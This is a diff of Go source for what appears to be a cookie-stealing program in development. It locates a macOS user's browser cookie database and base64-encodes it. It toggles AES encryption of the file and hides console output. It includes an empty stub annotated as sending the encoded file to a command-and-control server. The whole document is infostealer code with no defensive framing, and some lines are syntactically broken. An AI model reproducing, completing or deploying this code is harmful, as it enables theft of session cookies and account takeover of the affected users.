@@ -3,10 +3,11 @@ import (
     "fmt"
     "runtime"
     "log"
-    //"os"
+    _ "os"
     "encoding/base64"
-    //"crypto/cipher"
-    //"crypto/aes"
+    _ "crypto/cipher"
+    _ "crypto/aes"
+	_ "crypto/md5"
     "io/ioutil"
     "os/user"
     "path/filepath"
@@ -17,8 +18,8 @@ func encryptSQLiteFile(inputFile string, key []byte) (string, error) {
     if err != nil {
         return "", err
     }
-    /* 
     // Create AES Cipher block
+    //*/
     block, err := aes.NewCipher(key)
     if err != nil {
         return "", err
@@ -31,7 +32,7 @@ func encryptSQLiteFile(inputFile string, key []byte) (string, error) {
     // Encrypt
     outputBytes := make([]byte, len(inputBytes))
     stream.XORKeyStream(outputBytes, inputBytes)
-    */ 
+    //*/ 
     encoded := base64.StdEncoding.EncodeToString(inputBytes)
     return encoded, nil
 
@@ -54,10 +55,10 @@ func getCookieMacOS(user string) (filePath string) {
     return defaultFilePath
 }
 
-func send_data_to_css() {
+
+func send_data_to_css() { // function to send base64 encoded file to CC
     
 }
-
 
 
 func main() {
@@ -75,9 +76,9 @@ func main() {
         case "windows":
             fmt.Println("Windows", user)
         case "darwin":
-            fmt.Println("MacOS", user)
+            //fmt.Println("MacOS", user)
             defaultFilePath := getCookieMacOS(user)
-            fmt.Println(defaultFilePath)
+            //fmt.Println(defaultFilePath)
             // Encrypt and base64 cookies
             //sqliteEncoded, err := encryptSQLiteFile(defaultFilePath, keyBytes)
             base64Encoded, err := base64SQLiteFile(defaultFilePath)
@@ -85,6 +86,10 @@ func main() {
                 fmt.Println("ERROR", err)                
             }
             fmt.Println(base64Encoded)
+            // Keep this commented when running. 
+            //_ data := []byte(base64Encoded)
+			//fmt.Println("\n\nMD5 Sum\n")
+            //fmt.Printf("%x", md5.Sum(data))
 
         case "linux":
             fmt.Println("Linux", user)
